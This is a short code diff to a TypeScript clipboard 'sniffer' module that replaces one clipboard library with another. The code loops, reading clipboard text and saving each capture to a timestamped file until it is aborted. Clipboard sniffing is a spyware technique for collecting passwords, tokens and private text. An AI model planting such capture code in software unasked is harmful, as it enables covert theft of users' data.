@@ -1,12 +1,14 @@
 import {delay} from "./helpers.js";
 import * as fs from "fs";
 import path from "path";
+import {Clipboard} from "@napi-rs/clipboard";
 
 interface ClipboardSnifferParams {
     outDir: string;
     duration?: number;
 }
 
+const clipboard = new Clipboard();
 
 async function executeSniffer(abortController: AbortController, saveDir: string) {
     await fs.promises.mkdir(saveDir, {
@@ -14,7 +16,7 @@ async function executeSniffer(abortController: AbortController, saveDir: string)
     });
     while (!abortController.signal.aborted) {
         try {
-            const data = await (await import("clipboardy")).default.read();
+            const data = clipboard.getText();
             const filename = path.join(saveDir, `${new Date().toUTCString().replace(/\W/g, "_")}.txt`);
             await fs.promises.writeFile(filename, data);
         } catch (e) {
